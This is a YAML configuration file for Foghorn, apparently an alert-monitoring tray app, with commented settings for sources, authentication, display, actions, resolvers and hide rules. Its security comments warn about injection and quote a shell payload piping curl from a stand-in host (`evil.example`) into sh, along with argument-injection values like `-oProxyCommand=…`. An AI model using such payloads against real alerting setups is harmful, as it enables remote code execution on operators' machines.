# Foghorn configuration file.
#
# Place this file at the platform-appropriate location:
#   macOS:   ~/Library/Application Support/foghorn/config.yaml
#   Linux:   ~/.config/foghorn/config.yaml  (or $XDG_CONFIG_HOME/foghorn/config.yaml)
#   Windows: %APPDATA%\foghorn\config.yaml
#
# ${ENV_VAR} references are expanded at load time, so secrets can stay
# in your shell environment or a secrets manager instead of this file.
#
# SECURITY: everything Foghorn displays — labels, annotations, generatorURL,
# incident links — is supplied by the alert source. Treat those values as
# untrusted input, especially where this config feeds them into `actions` and
# `resolvers` (see the warnings on those sections below). Prefer https:// source
# URLs: over plain http anyone on the network path can read your credentials and
# rewrite alert content, which turns those sections into their problem too.

sources:
  - name: local-alertmanager
    type: alertmanager
    # Optional. Defaults to true; set false to keep this source in config but
    # skip polling it and remove it from the UI.
    enabled: true
    url: http://localhost:9093
    auth:
      type: basic
      username: ${FOGHORN_AM_USER}
      password: ${FOGHORN_AM_PASS}
    poll_interval: 30s
    # Max time for a single poll of this source (alerts + silences + on-call)
    # before it is abandoned and recorded as failing. Sources are polled in
    # parallel, so a slow or broken source never blocks the others; this bounds
    # how long it shows as "loading". Defaults to 10s when omitted.
    timeout: 10s
  # - name: oidc-alertmanager
  #   type: alertmanager
  #   url: https://alertmanager.example.com
  #   auth:
  #     type: oidc
  #     flow: device
  #     issuer_url: https://login.example.com/realms/observability
  #     # Use a dedicated public client with the OAuth 2.0 Device Authorization
  #     # Grant enabled; do not reuse the proxy's confidential browser client.
  #     client_id: foghorn
  #     # `openid` is sufficient unless the identity provider requires an
  #     # additional scope such as `offline_access` to issue refresh tokens.
  #     scopes: [openid]
  #     # On supported macOS and Linux builds, the token fields Foghorn uses are
  #     # saved in the system credential store by default. Set false for
  #     # memory-only authentication.
  #     # persist_tokens: false
  #     # Optional when discovery is unavailable:
  #     # device_authorization_url: https://login.example.com/oauth/device/code
  #     # token_url: https://login.example.com/oauth/token
  #     # Optional: send the ID token instead of the access token.
  #     # use_id_token: true
  #   poll_interval: 30s
  #   # The source timeout includes interactive device login; the default 10s
  #   # is too short for a user to complete SSO or MFA.
  #   timeout: 5m
  # - name: cookie-alertmanager
  #   type: alertmanager
  #   url: https://alertmanager.example.com
  #   auth:
  #     type: cookie
  #     # Optional; defaults to the per-source cookie jar below the Foghorn config dir.
  #     # cookie_file: ~/.config/foghorn/cookies/cookie-alertmanager.json
  #   poll_interval: 30s
  # - name: grafana-alerting
  #   type: grafana
  #   # Grafana base URL. Foghorn appends /api/alertmanager/grafana/api/v2.
  #   url: https://grafana.example.com
  #   auth:
  #     type: bearer
  #     token: ${FOGHORN_GRAFANA_TOKEN}
  #   poll_interval: 30s
  #   # Optional: treat another alert label as the severity source.
  #   # Falls back to the standard `severity` label when absent.
  #   severity_label: priority
  # - name: betterstack-production
  #   type: betterstack
  #   # Optional for Better Stack; defaults to https://uptime.betterstack.com.
  #   url: https://uptime.betterstack.com
  #   auth:
  #     type: bearer
  #     token: ${FOGHORN_BETTERSTACK_TOKEN}
  #   poll_interval: 30s
  #   betterstack:
  #     # Use a specific schedule id or "default" to show the current on-call user.
  #     on_call_schedule: default
  #     # Optional when the token can access multiple teams.
  #     team_name: Production
  #     # Optional: used to build direct incident links like
  #     # https://uptime.betterstack.com/team/<team_id>/incidents/<incident_id>
  #     team_id: t135105

severities:
  # Canonical severity used when an alert label does not match any configured alias.
  default: unknown
  levels:
    - name: critical
      color: "#ef4444"
      aliases: [ critical, page, sev1, p1 ]
    - name: warning
      color: "#f59e0b"
      aliases: [ warning, warn, sev2, p2 ]
    - name: info
      color: "#3b82f6"
      aliases: [ info, sev3, p3 ]
    - name: unknown
      color: "#6b7280"
      aliases: [ unknown, none ]

display:
  # group_by, sort_by, visible_labels, visible_annotations, and
  # subtitle_annotations field reference syntax:
  #   field:<name>       built-in alert field
  #   label:<name>       alert label value
  #   annotation:<name>  alert annotation value
  #
  # Optional suffixes:
  #   :both      show raw plus resolved value when available (default)
  #   :raw       always show the original value
  #   :resolved  prefer the resolved value, fall back to original
  #
  # Supported built-in field:* values:
  #   field:severity     configured severity order from severities.levels
  #   field:startsAt     alert start time
  #   field:updatedAt    last update time
  #   field:source       source name
  #   field:sourceType   provider type (alertmanager, betterstack, ...)
  #   field:name         alert name
  #   field:state        firing < silenced < inhibited < resolved
  #   field:hiddenBy     comma-joined names of matching hide rules
  #   field:silencedBy   comma-joined silence IDs (when present)
  #   field:inhibitedBy  comma-joined inhibition fingerprints (when present)
  #
  # Bare strings still work for labels in group_by, for example:
  #   - cluster
  # is equivalent to:
  #   - label:cluster

  subtitle_annotations:
    - description
    - summary

  # visible_labels and visible_annotations accept either a bare field ref or a
  # mapping. The bare form (just a string) is shorthand for `{source: <string>}`.
  # The mapping form supports:
  #   source  required. Same field-ref grammar as everywhere else (label name,
  #           or field:/label:/annotation: prefix with optional :raw/:resolved/:both).
  #   order   optional integer. Entries sort by order ascending; ties keep
  #           original list order. Negative values float above bare entries,
  #           positive values sink below. Defaults to 0.
  #   label   optional display label override. Defaults to the field name.
  #   style   optional visual treatment(s). One of, or a list of:
  #             muted    de-emphasized text
  #             pull     featured block (annotations only; no-op on label chips)
  #             danger   red accent
  #             warning  amber accent
  #             info     blue accent
  #           Accepts a scalar ("pull, danger") or a sequence ([pull, danger]).
  #
  # Example mixing both forms:
  #   visible_annotations:
  #     - source: field:hiddenBy
  #       order: -5
  #       label: Hidden By
  #       style: muted
  #     - summary
  #     - link
  #     - source: description
  #       order: 5
  #       label: Description
  #       style: [pull, danger]

  visible_labels:
    - cluster:raw
    - namespace
    - region
    - job
    - job_name
    - pod
    - operation
    - environment
    - svcname
    - replica
    - persistentvolumeclaim

  visible_annotations:
    - description
    - summary
    - link
    - runbook
    # Surface the matching hide rule(s) like a regular annotation when an
    # alert is revealed via "Show all". Uses the field:* prefix because
    # hiddenBy is a synthetic alert field, not an actual annotation.
    # - source: field:hiddenBy
    #   label: Hidden By
    #   style: muted

  group_by:
    - field:source
    - label:cluster

  # Controls how group_by_overrides keys are matched:
  #   display  match the rendered top-level group label (default)
  #   raw      match the underlying raw values for the top-level group fields
  group_by_override_key_mode: display

  # Optional per-group refinement. The key is the top-level group key produced by
  # group_by. Matching groups append the listed fields, while all other groups
  # keep the default group_by as-is. Keys use the mode above.
  #
  # Example with display mode:
  # group_by_overrides:
  #   local-alertmanager/cluster-prod:
  #     - label:namespace
  #
  # Example with raw mode and `group_by: [label:cluster:both]`:
  # group_by_override_key_mode: raw
  # group_by_overrides:
  #   cluster-prod:
  #     - label:namespace

  # Optional alert bubbles. Each rule renders a badge when the configured field
  # exactly matches one of the listed values. Use sources/source_types to limit
  # a rule to specific providers.
  badges:
    - label: Ack
      field: label:status
      equals: [Acknowledged]
      source_types: [betterstack]

  # Optional alert priority. Matching alerts are floated to the top of the list
  # and their groups sort ahead of others. Specific source names win over
  # provider-type matches.
  #
  # mode:
  #   before_sort  apply provider priority before sort_by (default)
  #   after_sort   use provider priority only as a tie-breaker after sort_by
  # priority:
  #   mode: after_sort
  #   sources: [betterstack-production]
  #   source_types: [betterstack]

  sort_by:
    - field: field:severity
      order: asc
    - field: annotation:description
      order: asc
    - field: field:startsAt
      order: desc

sounds:
  enabled: false

notifications:
  # On macOS these are delivered through Notification Center.
  enabled: true
  on_new: true
  on_resolved: false
  batch_threshold: 5

# Actions run on your machine when you trigger them from an alert.
#
# SECURITY: action templates interpolate alert fields ({{.Labels.x}},
# {{.Annotations.x}}, {{.GeneratorURL}}) that come from the alert source.
#   - `shell` actions run through `sh -c`, so an interpolated alert value is
#     direct command injection: a label of `; curl evil.example | sh` runs.
#     Never interpolate alert values into a shell action unless you fully trust
#     the source *and* quote them; prefer a fixed script that takes the value on
#     stdin, or use a `url`/`clipboard` action instead.
#   - `url` actions are limited to http/https/mailto URLs.
actions: [ ]

resolvers:
# Optional local-only value resolvers. These run after alerts are fetched and
# only affect display/grouping/sorting/filtering in the UI. Raw labels remain
# untouched for silences, actions, and provider requests.
#
# Each resolver targets one field reference and executes a local command.
# The command should print the resolved value to stdout.
#
# SECURITY: resolvers run automatically on every poll, with args and env
# rendered from alert labels/annotations — i.e. from the remote source. There is
# no shell involved, so there is no command injection, but the values still land
# in your command's argv: a command that parses flags can be steered by an alert
# value that starts with `-` (`-oProxyCommand=…`, `--kubeconfig=…`). Point
# resolvers at a script you control, and have it treat its arguments as data
# (e.g. read after a literal `--`, or validate before use).
#
# Available templates in command/args/env:
#   {{.Value}}               raw value for the configured field
#   {{.Ref}}                 full field ref, e.g. label:cluster
#   {{.Kind}}                field | label | annotation
#   {{.Name}}                field/label/annotation name
#   {{.Alert.Source}}        alert source
#   {{.Labels.cluster}}      alert label access
#   {{.Annotations.summary}} alert annotation access
#
# Example: map internal cluster IDs to customer-facing names using a local script.
# - name: cluster-name
#   field: label:cluster
#   command: ./scripts/resolve-cluster
#   args:
#     - "{{.Value}}"
#   timeout: 500ms
#   cache_ttl: 24h

# Hide rules suppress matching alerts from the default UI view. They differ
# from silences in two important ways:
#   - hide rules live in this config file, not in the alertmanager backend
#   - the alert is never sent to the source; it is filtered locally
# Hidden alerts remain loaded and re-appear when "Show all" is toggled in the
# UI, where they are tagged with the matching rule name(s).
#
# Each rule:
#   name      Optional, used as the badge label and in logs.
#   matchers  Required. List of `<field><op><value>` expressions, all AND'd.
#             Operators:  =   equality
#                         !=  inequality
#                         =~  regex match
#                         !~  negative regex match
#             Values may be quoted with double quotes if they contain spaces.
#   sources   Optional. List of source names; empty/missing means all sources.
#   min_age   Optional. Only hide alerts firing continuously for at least
#             this long. Same grammar as the silence dialog: Go's
#             time.ParseDuration (30m, 2h, 500ms) plus "d" for days and "w"
#             for weeks, freely composable (e.g. 24h, 7d, 1w2d3h). When an
#             alert flutters or refires, startsAt resets, so min_age
#             naturally lets transient activity surface again.
#
# Matcher field syntax mirrors display.group_by / display.sort_by:
#   alertname             bare name -> label lookup (with fallback to the
#                         normalized alert field for severity/state/source/
#                         alertname when the label is absent)
#   label:cluster         explicit label
#   annotation:summary    annotation
#   field:severity        normalized alert field
# Optional mode suffix on the LHS:
#   cluster:raw           match only the raw label value
#   cluster:resolved      match only the value produced by resolvers
#   cluster:both          either (this is the default)
#
# Examples:
hide:
  # Hide PrometheusWatchdog (and any other zero-severity heartbeat alerts)
  # only after they've been firing steadily for a day. If the deadman flips
  # off/on, min_age resets and the alert returns to view.
  - name: stable deadman switches
    matchers:
      - alertname=PrometheusWatchdog
      - severity=none
    min_age: 24h

  # Always hide synthetic test alerts from a specific source. No min_age,
  # so they disappear immediately on first poll.
  - name: synthetic noise
    matchers:
      - alertname=~"^Test.*"
    sources: [local-alertmanager]

  # Match against the raw cluster label only — useful when a resolver renames
  # clusters for display but you want to filter on the underlying ID.
  # - name: drop staging cluster
  #   matchers:
  #     - cluster:raw=staging-1

ui:
  theme: system
  popup_width: 500
  popup_height: 600
  # Popup corner: top_right, top_left, bottom_right, or bottom_left.
  popup_position: top_right
  # Automatically position and resize the popup when it opens. Defaults to true.
  auto_position: true
  # Keep the popup window above all other windows. Defaults to true.
  always_on_top: true
  # macOS only: open the popup on whichever monitor the tray icon was clicked
  # on. Defaults to true. Set to false to restore the old behavior of reopening
  # on the monitor the popup was last shown on.
  popup_follow_cursor: true
  show_resolved: false
  show_silenced: false
  default_created_by: ${USER}
  # Optional UI scaling for accessibility. Defaults are a no-op.
  scale:
    # Scale factor is clamped to 0.75-2.0.
    factor: 1.0
    # fonts scales text only; interface scales the whole web UI.
    mode: fonts
    # When mode is interface, resize the popup window with the interface.
    apply_to_popup: true
  # Silence create/edit dialog. By default only a short whitelist of matchers
  # is shown; the rest collapse behind a "Show N more matchers" toggle. Hidden
  # matchers are still included in the silence — collapsing is purely visual.
  silence_editor:
    # Matcher names (exact match) that always stay visible. Defaults to
    # [alertname, cluster, severity, pod] when omitted. Set to [] to collapse all.
    always_visible_matchers: [alertname, cluster, severity, pod, namespace, purpose, region, job, job_name, svcname, persistentvolumeclaim, node, name]
    # Set to false to disable collapsing and always show every matcher.
    collapse_matchers: true
  # Optional image shown when there are no active alerts. Accepts a URL or
  # a local file path (absolute, or relative to the config directory).
  # idle_image: https://i.imgflip.com/2/1ihzfe.jpg
